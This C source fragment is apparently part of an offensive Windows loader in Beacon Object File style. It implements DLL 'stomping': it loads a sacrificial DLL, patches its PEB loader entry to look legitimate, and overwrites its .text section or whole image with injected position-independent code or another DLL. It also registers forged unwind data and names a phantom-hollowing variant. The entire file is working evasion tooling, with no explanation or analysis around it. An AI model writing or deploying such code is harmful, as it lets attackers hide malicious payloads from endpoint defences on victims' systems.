    PSP_PEB_LDR_DATA pLdr = pPeb->Ldr;
    PSP_LIST_ENTRY head    = &pLdr->InLoadOrderModuleList;
    PSP_LIST_ENTRY cur     = head->Flink;

    while (cur != head) {
        PSP_LDR_DATA_TABLE_ENTRY entry = (PSP_LDR_DATA_TABLE_ENTRY)cur;

        if (entry->DllBase == moduleBase) {
            /* Restore EntryPoint from the PE header */
            entry->EntryPoint = (PVOID)((ULONG_PTR)moduleBase + nt->OptionalHeader.AddressOfEntryPoint);

            /* Set LDRP_IMAGE_DLL | LDRP_ENTRY_PROCESSED */
            entry->Flags |= SP_LDRP_IMAGE_DLL | SP_LDRP_ENTRY_PROCESSED;

            StealthDbg("_sp_patch_ldr_entry: patched DllBase=%p EntryPoint=%p Flags=0x%X\n", moduleBase, entry->EntryPoint, entry->Flags);
            return;
        }
        cur = cur->Flink;
    }
    StealthDbg("WARN: _sp_patch_ldr_entry: module %p not found in InLoadOrderModuleList\n", moduleBase);
}

static BOOL StompPICO( PICO_ARGS picoArgs ) {
#if defined(STOMP_TECHNIQUE) && STOMP_TECHNIQUE == 2
    StealthDbg("StompPICO: using Phantom DLL Hollowing (NTFS Transaction) technique\n");
    return StompPICOPhantom(picoArgs);
#elif defined(STOMP_TECHNIQUE) && STOMP_TECHNIQUE == 1
    StealthDbg("StompPICO: using NtCreateSection + NtMapViewOfSection technique\n");
    return StompPICONtSection(picoArgs);
#else
    StealthDbg("StompPICO: using LoadLibraryEx technique\n");
    DWORD oldProt = 0;

    HMODULE hModule = KERNEL32$LoadLibraryExA(picoArgs.sacrificialDll, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!hModule) {
        StealthDbg("ERROR: failed to load sacrificial DLL '%s'\n", picoArgs.sacrificialDll);
        return FALSE;
    }
    StealthDbg("loaded sacrificial DLL '%s' at %p\n", picoArgs.sacrificialDll, hModule);

    _sp_patch_ldr_entry((PVOID)hModule);

    PIMAGE_DOS_HEADER   pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS   pNtHeader  = (PIMAGE_NT_HEADERS)((ULONG_PTR)hModule + pDosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeader);

    PVOID pTextSection = NULL;
    DWORD textSize     = 0;

    for (WORD i = 0; i < pNtHeader->FileHeader.NumberOfSections; i++) {
        if ((*(DWORD*)pSection->Name | 0x20202020) == 'xet.') {
            pTextSection = (PVOID)((ULONG_PTR)hModule + pSection->VirtualAddress);
            textSize     = pSection->Misc.VirtualSize;
            StealthDbg("found .text section at %p with size 0x%X\n", pTextSection, textSize);
            break;
        }
        pSection++;
    }

    if (!pTextSection || textSize == 0) {
        StealthDbg("ERROR: failed to find .text section in sacrificial DLL\n");
        KERNEL32$VirtualFree(hModule, 0, MEM_RELEASE);
        return FALSE;
    }

    *(picoArgs.pico_dst) = (PICO*)pTextSection;

    SIZE_T regionSize = (SIZE_T)textSize;
    NTDLL$NtProtectVirtualMemory((HANDLE)(LONG_PTR)-1, (PVOID*)&pTextSection, &regionSize, PAGE_READWRITE, &oldProt);

    PicoLoad(picoArgs.funcs, picoArgs.pico_src, (*picoArgs.pico_dst)->code, (*picoArgs.pico_dst)->data);

    DWORD picoCodeSize = (DWORD)PicoCodeSize(picoArgs.pico_src);
    unsigned char* code = (unsigned char*)(*picoArgs.pico_dst)->code;

    unsigned char* unwindSlot = code + picoCodeSize;
    unwindSlot[0] = 0x01;
    unwindSlot[1] = 0x00;
    unwindSlot[2] = 0x00;
    unwindSlot[3] = 0x00;

    RUNTIME_FUNCTION* rfTable = picoArgs.pico_rf_storage;
    rfTable[0].BeginAddress   = 0;
    rfTable[0].EndAddress     = picoCodeSize;
    rfTable[0].UnwindData     = picoCodeSize;

    DWORD coverSize = picoCodeSize + 4;
    regionSize = (SIZE_T)coverSize;
    NTDLL$NtProtectVirtualMemory((HANDLE)(LONG_PTR)-1, (PVOID*)&code, &regionSize, PAGE_EXECUTE_READ, &oldProt);

    KERNEL32$FlushInstructionCache((HANDLE)(LONG_PTR)-1, code, (SIZE_T)coverSize);

    StealthDbg("VirtualProtect(code, 0x%X, PAGE_EXECUTE_READ, 0x%X)\n", coverSize, oldProt);

    KERNEL32$RtlDeleteFunctionTable((PRUNTIME_FUNCTION)hModule);
    KERNEL32$RtlAddFunctionTable(rfTable, 1, (DWORD64)code);
    return TRUE;
#endif
}

static BOOL StompDLL( DLL_ARGS dllArgs ) {
#if defined(STOMP_TECHNIQUE) && STOMP_TECHNIQUE == 2
    StealthDbg("StompDLL: using Phantom DLL Hollowing (NTFS Transaction) technique\n");
    return StompDLLPhantom(dllArgs);
#elif defined(STOMP_TECHNIQUE) && STOMP_TECHNIQUE == 1
    StealthDbg("StompDLL: using NtCreateSection + NtMapViewOfSection technique\n");
    return StompDLLNtSection(dllArgs);
#else
    StealthDbg("StompDLL: using LoadLibraryEx technique\n");
    DWORD oldProt = 0;
    *(dllArgs.dll_dst) = (char*)KERNEL32$LoadLibraryExA(dllArgs.sacrificialDll, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!*(dllArgs.dll_dst)) {
        StealthDbg("ERROR: failed to load sacrificial DLL '%s'\n", dllArgs.sacrificialDll);
        return FALSE;
    }

    _sp_patch_ldr_entry((PVOID)*(dllArgs.dll_dst));

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)(*(dllArgs.dll_dst));
    PIMAGE_NT_HEADERS pNtHeader  = (PIMAGE_NT_HEADERS)((ULONG_PTR)*(dllArgs.dll_dst) + pDosHeader->e_lfanew);
    DWORD dllSize = pNtHeader->OptionalHeader.SizeOfImage;
    StealthDbg("loaded sacrificial DLL '%s' at %p with SizeOfImage=0x%X\n", dllArgs.sacrificialDll, *(dllArgs.dll_dst), dllSize);   

    for (DWORD offset = 0; offset < dllSize; offset += 0x900) {
        DWORD chunkSize = (offset + 0x900 <= dllSize) ? 0x900 : (dllSize - offset);
        DWORD chunkProt = 0;
        BOOL vpRet = KERNEL32$VirtualProtect((PVOID)((ULONG_PTR)*(dllArgs.dll_dst) + offset), chunkSize, PAGE_READWRITE, &chunkProt);
    }

    MSVCRT$memset(*(dllArgs.dll_dst), 0, dllSize);
    
    LoadDLL(dllArgs.dll_data, *(dllArgs.dll_src), *(dllArgs.dll_dst));
    ProcessImports(dllArgs.funcs, dllArgs.dll_data, *(dllArgs.dll_dst));

    return TRUE;
#endif
}

BOOL Stomp( STOMP_ARGS stompArgs ) {
    switch (stompArgs.resourceType) {
        case rPICO:
            StealthDbg("Stomping PICO into memory...\n");
            StealthDbg("PICO source size: code=0x%X data=0x%X\n", PicoCodeSize(stompArgs.picoArgs.pico_src), PicoDataSize(stompArgs.picoArgs.pico_src));
            return StompPICO(stompArgs.picoArgs);
        case rDLL:
            StealthDbg("Stomping DLL into memory...\n");
            StealthDbg("DLL source size: 0x%X\n", SizeOfDLL(stompArgs.dllArgs.dll_data));
            return StompDLL(stompArgs.dllArgs);
    }
    return FALSE;
}